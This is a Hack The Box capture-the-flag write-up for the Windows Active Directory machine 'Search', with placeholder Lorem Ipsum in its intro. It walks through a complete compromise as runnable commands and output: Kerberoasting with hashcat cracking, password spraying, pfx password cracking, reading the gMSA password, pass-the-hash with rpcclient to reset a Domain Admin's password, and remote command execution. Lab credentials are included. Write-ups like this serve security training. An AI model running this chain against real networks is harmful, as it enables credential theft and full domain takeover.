---
layout: single
title: Search - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2022-01-05
classes: wide
header:
  teaser: /assets/images/htb-writeup-search/search_logo.png
  teaser_home_page: true
  icon: /assets/images/windows.png
categories:
  - hackthebox
  - infosec
tags:  
  - windows
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-search/search_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
<br>

----------------

# USER

### Step 1

**nmap:**
```bash
┌──(void㉿void)-[/htb/search]
└─$ nmap -p- 10.10.11.129
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
8172/tcp  open  unknown
9389/tcp  open  adws
49666/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49695/tcp open  unknown
49705/tcp open  unknown


┌──(void㉿void)-[/htb/search]
└─$ nmap -Pn -n -sCV -p53,80,88,135,139,389,443,445,464,593,636,3268,3269,8172,9389,4966,49669,49670,49695,49705 10.10.11.129
PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2022-01-03 08:57:12Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.
443/tcp   open     ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Search &mdash; Just Testing IIS
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
593/tcp   open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.
3268/tcp  open     ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.
3269/tcp  open     ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.
4966/tcp  filtered unknown
8172/tcp  open     ssl/http      Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_ssl-date: 2022-01-03T08:58:40+00:00; +2m17s from scanner time.
| tls-alpn: 
|_  http/1.1
9389/tcp  open     mc-nmf        .NET Message Framing
49669/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49670/tcp open     msrpc         Microsoft Windows RPC
49695/tcp open     msrpc         Microsoft Windows RPC
49705/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2m16s, deviation: 0s, median: 2m16s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-01-03T08:58:05
|_  start_date: N/A

```

**dirb:**
```bash
==> DIRECTORY: http://10.10.11.129/certenroll/
+ http://10.10.11.129/certsrv (CODE:401|SIZE:1293)
==> DIRECTORY: http://10.10.11.129/css/
==> DIRECTORY: http://10.10.11.129/fonts/
==> DIRECTORY: http://10.10.11.129/images/
==> DIRECTORY: http://10.10.11.129/Images/
+ http://10.10.11.129/index.html (CODE:200|SIZE:44982)
==> DIRECTORY: http://10.10.11.129/js/
+ http://10.10.11.129/staff (CODE:403|SIZE:1233) 
```

**nikto:**
```bash
PORT 80:
+ Server: Microsoft-IIS/10.0
+ Retrieved x-aspnet-version header: 4.0.30319
```

**ffuf:**
```bash
N/A
```

**Domain:** search.htb
**Hostname:** research

Looking closely on the webpage we find [THIS IMAGE](https://search.htb/images/slide_2.jpg) containing the password `IsolationIsKey?` and user Hope Sharp.

![[Pasted image 20220103130917.png]]

Using `namemash.py` we can create the most common permutations of Hope Sharp to hopefully get a valid username.

```bash
┌──(void㉿void)-[/htb/search]
└─$ cat hope.txt     
Hope Sharp

┌──(void㉿void)-[/htb/search]
└─$ /opt/namemash.py hope.txt > hope-username.txt

┌──(void㉿void)-[/htb/search]
└─$ cat hope-username.txt 
hopesharp
sharphope
hope.sharp
sharp.hope
sharph
hsharp
shope
h.sharp
s.hope
hope
sharp
```

----------
<br>
### Step 2
Trying to dump hashes with GetNPUsers we find that **`hope.sharp`** is a valid user, however PREAUTH is not set.
```powershell
┌──(void㉿void)-[/htb/search]
└─$ impacket-GetNPUsers search.htb/ -usersfile hope-username.txt -format hashcat -dc-ip 10.10.11.129 -outputfile hash.txt                                 1 ⨯
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] User hope.sharp doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

To get a quick overview of the domain we can use `ldapdomaindump`, this will provide data similar to the Windows tool `ADsearch.exe`.
```bash
┌──(void㉿void)-[/htb/search]
└─$ ldapdomaindump 10.10.11.129 -u 'search.htb\hope.sharp' -p 'IsolationIsKey?' -o ldapdump.out
[*] Connecting to host...
[*] Binding to host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

From the dump we find a few interesting things..
**.. Credentials** `hope.sharp:IsolationIsKey?` is correct and working.

**.. Computers:**
![[Pasted image 20220103134201.png]]
![[Pasted image 20220103134647.png]]

**.. Users:**
![[Pasted image 20220103134335.png]]
![[Pasted image 20220103134421.png]]
![[Pasted image 20220103134819.png]]
![[Pasted image 20220103134855.png]]
![[Pasted image 20220103134934.png]]

**.. Groups:**
![[Pasted image 20220103135204.png]]

Extract all users to a new .txt list.
```bash
┌──(void㉿void)-[/htb/search/ldapdump.out]
└─$ awk '{print $5}' domain_users.grep > domain-users.txt
```

Trying password re-use with the list of all valid users over LDAP and SMB fails.

-------------

### Step 3
With a valid set of credentials the next logical step for me would be to gather more information about the domain with Bloodhound to see if there are any roastable users, or other weak chains that we can exploit.

```bash
┌──(void㉿void)-[/htb/search]
└─$ bloodhound-python -u hope.sharp -p 'IsolationIsKey?' -ns 10.10.11.129 -d search.htb -c all
INFO: Found AD domain: search.htb
INFO: Connecting to LDAP server: research.search.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 113 computers
INFO: Connecting to LDAP server: research.search.htb
INFO: Found 106 users
INFO: Found 63 groups
INFO: Found 0 trusts
[... snip ...]
```

Running the raw query `MATCH (u:User {hasspn:true}) RETURN u` in Bloodhound we find all users that are Kerberoastable, where we get a match on user `web_svc`.

![[Pasted image 20220104084939.png]]

```bash
┌──(void㉿void)-[/htb/search]
└─$ impacket-GetUserSPNs search.htb/Hope.Sharp:IsolationIsKey? -request   
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
---------------------------------  -------  --------  --------------------------  ---------  ----------
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 14:59:11.329031  <never>               

$krb5tgs$23$*web_svc$SEARCH.HTB$search.htb/web_svc*$bcaea98d34938aaf0f71290965b41e6c$32ee2f404583f6ff18c9dfc97fa4bf66c740dfb9ed1f72040dd09e579075dd3413c0a2b4129dfaa17fc1860e82a8e705954a5026985f34b4a42bdb87ae73fcf00ebcd1a7d51f92b0d7d1eb2d590fa105eb7b7e392d26dec89499fd1aff98561cad219c1b928d7093debd78399ddff49908079115704f3814c4b469d278fa500ccdaa1c5fa5c5564e36602f7e7a0ca2d53deafe1f4eaef5362ccc88a321956568648e19a6457b002f08e4244239b57695ad9ab364d54de4944e80ec83827c24fc2e30e76e38733d2182a74ae29f7e08f35dc6365197d2dc2d74417800fa3a519812b991ade1ea45300cf82d1cf5e45083f7bf8e3d628ab68b13f579ce7415bd8cab13728a962d343277a22c1bea5edcbcbab1cec9517322378fb3fdde89576d56b67a84d70039725fc0794f786bbce8adec3daa64f2c6e46d54e0eb19c3192663950e250f50410357fdd5599e4a93cc7b51243f8149a50b65e1504cb3be183ee6c13ca2dbd869ff7305c8fa1018afb2303cdd165c0980fa42704aaffab17a1e2c1dd67a6697b000af3381f1ed2b9b8d0700e4ef59109f2c88e9df232b22c3c143cb92374495fccff957f900bab0326ae7cab850b61c7941c1dbcad1f8f50a804c5c450fba9ffd7b7a7f05b1566f01be596bdd87cd410927c94bf81bdb384fef3d6cde25d0e25f7f390bb8e21e7f2fb4c20ff85d6baa0a849b187ae3bbb28709b369aa279b32b3514e806f3f291ea2bc728a5475e7cf1d142ddc37136108a18d2886b500b12ea9d0cec3bc46aa3f486332084f9e38efef6a3a3089c3540da166cf266f49c4e049ec45b05a93731fca58c209abd5fe862ddfd426f9e6f8ad23c61817b6941588378c029249b25dd513ce691d338b25ac854d0b26046cd9f185216a46b05a8bdadf9f4de035a3222cd680eea13e1cdcfd517165d73d444d08c8a9453c298fe4880029c54897d08a9f45beb8429d71b22af79c3c6fe2c701b279e6444341c17b715840e3d208d6d95b7c7d82973f31c9357363bbf673291bd8e5e8fe933abe6a1ce09348967552d039bcc6302f6ce01966d6af0ed049f84efabdb734db987fed47f75a9ab5e6ceddf58350a999b574531511820c4d78d42c2b3d5914dc98da9acae8841d5a7080fb745161c80005f33d3b19b3c2f9d5ad0f9cf126812fca1385380ff5963d5392dd47b0f2e620127df20fa34e41c602494e2509c9336f8803b22bdd2253ee21632fe21020ca4a4c489e6623fbb8285fe134267a8635ad0efaea60f6dc576d8d887658ded96f0e0d4fa8d82a56f087aca73b1ac99698af69c93f46bd12509f89f840230c6e7dc6bebfd9c08f64e437a77ecff6e1aa92697c6623b6664ac489ceda0932cc64648d255671ea8415ac2a4f142e8a37d26e7c7ed8d4c81b0adbf29135bd60f94095de88e46ff81d9a415967e75be62e1d51098e8b3c5a2ff577ebb6035a50faff9ab2802dd120
```

```bash
┌──(void㉿void)-[/htb/search]
└─$ hashcat -a0 -m13100 web_svc-hash.txt /usr/share/wordlists/rockyou.txt
[... snip ...]

@3ONEmillionbaby
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
```

With the set of credentials `web_svc:@3ONEmillionbaby` the first thing I'd like to do is spray the other users with the found password.
```bash
┌──(void㉿void)-[/htb/search]
└─$ crackmapexec ldap 10.10.11.129 -u domain-users.txt -p '@3ONEmillionbaby' --continue-on-success
LDAP        10.10.11.129    389    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
LDAP        10.10.11.129    389    RESEARCH         [-] search.htb\Tristan.Davies:@3ONEmillionbaby
LDAP        10.10.11.129    389    RESEARCH         [+] search.htb\web_svc:@3ONEmillionbaby 
[... snip ...]
LDAP        10.10.11.129    389    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby
```

Great another set! Now we have the following three creds:
1. `hope.sharp:IsolationIsKey?`
2. `web_svc:@3ONEmillionbaby`
3. `edgar.jacobs:@3ONEmillionbaby`

-------------

### Step 4
Next lets look through the SMB shares of all the users.
```bash
┌──(void㉿void)-[/htb/search]
└─$ smbclient -L 10.10.11.129 -U hope.sharp                     
Enter WORKGROUP\hope.sharp password: 

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	CertEnroll      Disk      Active Directory Certificate Services share
	helpdesk        Disk      
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	RedirectedFolders$ Disk      
	SYSVOL          Disk      Logon server share
```

```bash
┌──(void㉿void)-[/htb/search]
└─$ smbclient \\\\10.10.11.129\\RedirectedFolders$ -U edgar.jacobs
Enter WORKGROUP\edgar.jacobs password: 
Try "help" to get a list of possible commands.
smb: \> recurse
smb: \> ls
[... snip ...]
\sierra.frye
  .                                  Dc        0  Thu Nov 18 02:01:46 2021
  ..                                 Dc        0  Thu Nov 18 02:01:46 2021
  Desktop                           DRc        0  Thu Nov 18 02:08:00 2021
  Documents                         DRc        0  Fri Jul 31 16:42:19 2020
  Downloads                         DRc        0  Fri Jul 31 16:45:36 2020
  user.txt                           Ac       33  Thu Nov 18 01:55:27 2021
  
[... snip ...]

\edgar.jacobs\Desktop
  .                                 DRc        0  Mon Aug 10 12:02:16 2020
  ..                                DRc        0  Mon Aug 10 12:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 22:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 12:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 22:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 12:35:44 2020
```

We are not able to view or download the user flag yet, so instead download `Phising_Attempt.xlsx` and view the document. We can see that the column C is hidden, and the option to unhide is greyed out - this is because the document is protected. 
![[Pasted image 20220104091939.png]]

![[Pasted image 20220104092027.png]]

We can easily bypass this by opening the .xlsx in Kali using Archive Manager. Go to `xl` > `worksheets` > open and edit `sheet2.xml`. 
Search for `sheetProtection` and remove the section. Save the file and you should now be able to unhide column C.

![[Pasted image 20220104092957.png]]

![[Pasted image 20220104093251.png]]

Grab user.txt that we found earlier in sierra.frye's SMB directory.
```bash
┌──(void㉿void)-[/htb/search]
└─$ smbclient \\\\10.10.11.129\\RedirectedFolders$ -U sierra.frye 

smb: \sierra.frye\> get user.txt
getting file \sierra.frye\user.txt of size 34 as user.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

┌──(void㉿void)-[/htb/search]
└─$ cat user.txt             
f50460b2d81200ea8e9242bd6560cf13
```

--------------

# ROOT Method 1

### Step 1 
Using Bloodhound we look for the Shortest Path to Domain Admin and find that users from ITSEC group (which sierra.frye is member of) have ReadGMSAPassword over user `BIR-ADFS-GMSA`.
![[Pasted image 20220104095416.png]]

```bash
┌──(void㉿void)-[/opt/gMSADumper]
└─$ python3 gMSADumper.py -u sierra.frye -p '$$49=wide=STRAIGHT=jordan=28$$18' -d search.htb                                                              1 ⨯
Users or groups who can read password for BIR-ADFS-GMSA$:
 > ITSec
BIR-ADFS-GMSA$:::e1e9fd9e46d0d747e1595167eedcec0f
```

Since `BIR-ADFS-GMSA$` have GenericAll to Domain Administrator `Tristan.Davies`, we are able to change his password to get root flag.
With rpcclient we are able to use both pass-the-hash and change passwords, perfect!
```bash
┌──(void㉿void)-[/htb/search]
└─$ pth-rpcclient -U search.htb/BIR-ADFS-GMSA$%00000000000000000000000000000000:e1e9fd9e46d0d747e1595167eedcec0f //10.10.11.129                           1 ⨯
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
rpcclient $> setuserinfo2 tristan.davies 23 ASDqwe123!
E_md4hash wrapper called.
E_deshash wrapper called.

┌──(void㉿void)-[/htb/search]
└─$ smbclient \\\\10.10.11.129\\C$ -U tristan.davies
Enter WORKGROUP\tristan.davies password: ASDqwe123!

[... snip ...]

smb: \Users\Administrator\Desktop\> ls
  .                                 DRc        0  Mon Nov 22 21:21:49 2021
  ..                                DRc        0  Mon Nov 22 21:21:49 2021
  desktop.ini                       AHS      282  Mon Nov 22 21:21:49 2021
  root.txt                          ARc       34  Mon Jan  3 09:51:07 2022

smb: \Users\Administrator\Desktop\> get root.txt
getting file \Users\Administrator\Desktop\root.txt of size 34 as root.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)

┌──(void㉿void)-[/htb/search]
└─$ cat root.txt                                                                      
33bf73102463a90e0fba8b6b9c3e4387
```

-----------------

# ROOT Method 2
### Step 1
We previously downloaded two certificate files from sierra through SMB, `staff.pfx` and `search-RESEARCH-CA.p12`.
```ad-quote
The PKCS#12 or PFX format is a binary format for storing the server certificate, intermediate certificates, and the private key in one encryptable file. PFX files usually have extensions such as .pfx and .p12. PFX files are typically used on Windows machines to import and export certificates and private keys.
```
To import the .pfx or .p12 files into Firefox we need to find its respective password. There are tools that can help us with this process, eg. `pfx2john`.
```bash
┌──(void㉿void)-[/htb/search]
└─$ /usr/share/john/pfx2john.py smb-loot/staff.pfx | john --wordlist=/usr/share/wordlists/rockyou.txt /dev/stdin                                          1 ⨯
Using default input encoding: UTF-8
Loaded 1 password hash (pfx [PKCS12 PBE (.pfx, .p12) (SHA-1 to SHA-512) 256/256 AVX2 8x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

misspissy        (staff.pfx)
1g 0:00:02:33 DONE (2022-01-04 15:11)
```

Or if you're super hipster and want to **wait for a few hours**, you can also run the loops below.
```bash
┌──(void㉿void)-[/htb/search/smb-loot]
└─$ cat /usr/share/wordlists/rockyou.txt | while read p; do echo Trying: $p; openssl pkcs12 -in staff.pfx -passin pass:$p; RC=$?; if [ $RC -eq 0 ]; then break; fi; done

[... snip ...]

Trying: 123
Mac verify error: invalid password?
Trying: misspissy
Bag Attributes
    localKeyID: 01 00 00 00 
    Microsoft CSP Name: Microsoft Enhanced Cryptographic Provider v1.0
    friendlyName: te-ITSecOps-42ad83c7-07ac-4daa-b273-be11dd691da5
Key Attributes
    X509v3 Key Usage: 10 
Enter PEM pass phrase:
```

Import the certificate to Firefox, clear the Cookies and Site Data, and we should now be able to reach https://search.htb/staff.

---------------

### Step 2
We previously found that users in the group ITSec also are a part of the group `Remote Management Users`, giving us two options.
1. ITSec user Sierra.Frye (password: `$$49=wide=STRAIGHT=jordan=28$$18`)
2. ITSec user Abby.Gonzalez (password: `&&75:major:RADIO:state:93&&`)
![[Pasted image 20220104154915.png]]

Looking in Bloodhound we can clearly see the option how to pwn the domain, from left to right. Both Abby and Sierra can login to research.search.htb (`CanPsRemote`), through https://search.htb/staff, and from there we should be able to dump the GMSA hash (since group `ITSec` have `ReadGMSAPassword` to account `BIR-ADFS-GMSA` that we saw in Method 1).
![[Pasted image 20220105073905.png]]

```powershell
PS C:\Users\Sierra.Frye\Documents> $gmsa = Get-ADServiceAccount -Identity 'BIR-ADFS-GMSA' -Properties 'msDS-ManagedPassword'
PS C:\Users\Sierra.Frye\Documents> $mp = ConvertFrom-ADManagedPasswordBlob $gmsa.'msDS-ManagedPassword'
PS C:\Users\Sierra.Frye\Documents> $mp

Version                   : 1
CurrentPassword           : ꪌ絸禔හॐ๠뒟娯㔃ᴨ蝓㣹瑹䢓疒웠ᇷꀠ믱츎孻勒壉馮ၸ뛋귊餮꤯ꏗ춰䃳ꘑ畓릝樗껇쁵藫䲈酜⏬궩Œ痧蘸朘嶑侪糼亵韬⓼ↂᡳ춲⼦싸ᖥ裹沑᳡扚羺歖㗻෪ꂓ㚬⮗㞗ꆱ긿쾏㢿쭗캵십ㇾେ͍롤
                            ᒛ�䬁ማ譿녓鏶᪺骲雰騆惿閴滭䶙竜迉竾ﵸ䲗蔍瞬䦕垞뉧⩱茾蒚⟒澽座걍盡篇
SecureCurrentPassword     : System.Security.SecureString
PreviousPassword          : 
SecurePreviousPassword    : 
QueryPasswordInterval     : 3013.16:52:19.9664471
UnchangedPasswordInterval : 3013.16:47:19.9664471

PS C:\Users\Sierra.Frye\Documents> ConvertTo-NTHash $mp.SecureCurrentPassword
e1e9fd9e46d0d747e1595167eedcec0f



      PS C:\Users\Sierra.Frye\Documents> $user = 'control.htb\hector'
      PS C:\Users\Sierra.Frye\Documents> $creds = New-Object System.Management.Automation.PSCredential($user,$mp.SecureCurrentPassword)
	  PS C:\Users\Sierra.Frye\Documents> Invoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { whoami }
```

---------------

### Step 3
Pass-the-Hash as `BIR-ADFS-GMSA$` over rpcclient, change password to `tristan.davies` and grab root.
```bash
┌──(void㉿void)-[/htb/search]
└─$ pth-rpcclient -U search.htb/BIR-ADFS-GMSA$%00000000000000000000000000000000:e1e9fd9e46d0d747e1595167eedcec0f //10.10.11.129
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
rpcclient $> setuserinfo2 tristan.davies 23 ASDqwe123!

┌──(void㉿void)-[/htb/search]
└─$ crackmapexec smb 10.10.11.129 -u tristan.davies -p ASDqwe123! -x 'type C:\Users\Administrator\Desktop\root.txt'
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10.0 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\tristan.davies:ASDqwe123! (Pwn3d!)
SMB         10.10.11.129    445    RESEARCH         [+] Executed command 
SMB         10.10.11.129    445    RESEARCH         8ffdc3acd86000b9eb7ace10e0c0462a
```

------

# References
**ReadGMSAPassword:**
https://www.thehacker.recipes/ad/movement/access-controls/readgmsapassword
https://stealthbits.com/blog/securing-gmsa-passwords/

**gMSADumper:**
https://github.com/micahvandeusen/gMSADumper

**Pass-the-Hash attacks:**
https://www.hackingarticles.in/lateral-movement-pass-the-hash-attack/

**rpcclient - change ad password:** 
https://malicious.link/post/2017/reset-ad-user-password-with-linux/

**bash return code (RC=$?)**: 
https://www.toolbox.com/tech/programming/question/help-with-rc-03310